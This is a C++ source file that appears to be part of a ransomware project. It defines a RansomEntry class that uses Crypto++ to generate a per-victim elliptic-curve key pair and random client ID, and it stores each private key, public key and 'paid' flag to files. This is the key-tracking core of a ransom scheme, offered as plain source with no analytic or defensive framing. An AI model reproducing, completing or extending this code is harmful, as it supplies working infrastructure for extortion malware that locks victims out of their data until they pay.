#include "RansomEntry.h"

RansomEntry RansomEntry::create(CryptoPP::AutoSeededRandomPool & rng)
{
	PrivateKey priv;
	priv.Initialize(rng, CryptoPP::ASN1::secp112r1());
	if (!priv.Validate(rng, 3))
	{
		throw std::runtime_error("Could not generate private key");
	}

	PublicKey pub;
	priv.MakePublicKey(pub);
	if (!pub.Validate(rng, 3))
	{
		throw std::runtime_error("Could not generate public key");
	}

	std::uint64_t randomId = 0x13371337;
	rng.GenerateBlock(reinterpret_cast<byte*>(&randomId), sizeof(randomId));
	return RansomEntry(pub, priv, randomId, false);
}

RansomEntry RansomEntry::readFromFile(std::uint64_t clientId, std::ifstream & privateFile, std::ifstream & publicFile, std::ifstream& infoFile)
{
	CryptoPP::Integer privateExp;
	privateExp.BERDecode(CryptoPP::FileSource(privateFile, true));
	PrivateKey priv;
	priv.AccessGroupParameters().Initialize(CryptoPP::ASN1::secp112r1());
	priv.SetPrivateExponent(privateExp);

	CryptoPP::ECP::Point publicPoint;
	PublicKey pub;
	pub.AccessGroupParameters().Initialize(CryptoPP::ASN1::secp112r1());
	pub.GetGroupParameters().GetCurve().DecodePoint(publicPoint, CryptoPP::FileSource(publicFile, true), pub.GetGroupParameters().GetCurve().EncodedPointSize(true));

	bool paid;
	infoFile >> paid;

	return RansomEntry(pub, priv, clientId, paid);
}

void RansomEntry::saveToFile(std::ofstream & privateFile, std::ofstream & publicFile, std::ofstream& infoFile)
{
	privateKey().GetPrivateExponent().DEREncode(CryptoPP::FileSink(privateFile));
	publicKey().GetGroupParameters().GetCurve().EncodePoint(CryptoPP::FileSink(publicFile), publicKey().GetPublicElement(), true);
	infoFile << hasPaid();
}

RansomEntry::RansomEntry(PublicKey publicKey, PrivateKey privateKey, std::uint64_t clientId, bool paid)
	: publicKey_(publicKey)
	, privateKey_(privateKey)
	, clientId_(clientId)
	, hasPaid_(paid)
{
}
